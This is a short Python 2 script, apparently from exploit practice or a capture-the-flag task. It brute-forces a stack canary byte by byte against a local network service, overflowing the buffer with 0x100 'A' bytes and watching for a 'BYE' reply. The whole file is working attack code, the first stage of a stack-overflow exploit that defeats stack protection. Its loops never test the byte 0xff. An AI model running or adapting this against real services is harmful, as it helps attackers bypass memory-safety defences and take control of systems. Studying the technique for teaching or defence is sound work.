#!/usr/bin/env python
from socket import *
from struct import pack
from time import sleep

p = lambda x : pack("<L", x)

def conn():
	s = socket(AF_INET, SOCK_STREAM)
	s.connect(("127.0.0.1", 1234))
	return s

first = second = third = fourth = 0x00

for first in range(0x00, 0xff):
	s = conn()
	s.recv(32)
	s.send("A"*0x100 + chr(first))
	if s.recv(32).find("BYE") != -1:
		print "[*] Found First Byte: 0x%02x"%first
		s.close()
		break
for second in range(0x00, 0xff):
	s = conn()
	s.recv(32)
	s.send("A"*0x100 + chr(first) + chr(second))
	if s.recv(32).find("BYE") != -1:
		print "[*] Found Second Byte: 0x%02x"%second
		s.close()
		break
for third in range(0x00, 0xff):
	s = conn()
	s.recv(32)
	s.send("A"*0x100 + chr(first) + chr(second) + chr(third))
	if s.recv(32).find("BYE") != -1:
		print "[*] Found Third Byte: 0x%02x"%third
		s.close()
		break
for fourth in range(0x00, 0xff):
	s = conn()
	s.recv(32)
	s.send("A"*0x100 + chr(first) + chr(second) + chr(third) + chr(fourth))
	if s.recv(32).find("BYE") != -1:
		print "[*] Found Fourth Byte : 0x%02x"%fourth
		s.close()
		break

print "[*] Canary: 0x%08x"%((fourth*0x1000000) + (third*0x10000) + (second*0x100) + first)